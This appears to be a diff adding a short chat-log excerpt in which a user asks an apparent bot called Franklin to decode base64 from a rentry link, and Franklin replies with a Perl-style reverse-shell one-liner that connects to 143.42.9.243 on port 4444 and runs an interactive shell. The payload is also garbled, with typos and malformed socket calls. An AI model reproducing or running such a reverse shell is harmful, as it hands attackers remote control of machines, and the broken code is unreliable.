@@ -1,0 +1,5 @@
+hazeyez asked decode this base64 cipher at this link: https://rentry.co/m2cwq/raw with hash 58af9d6a
+<---- snip ---->
+K
+
+Franklin decodes the base64 cipher from the given link and returns the following response to hazeyez: "User Socket; $i="143.42.9.243";$p="4444";socket(S,PF_INET,SOCK_STREAM);if(connect(S,$p,inet_addr($i)))open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");system(SDIN,"echo 'e2'");open(STDERR,">&S");exec("sh -i");"
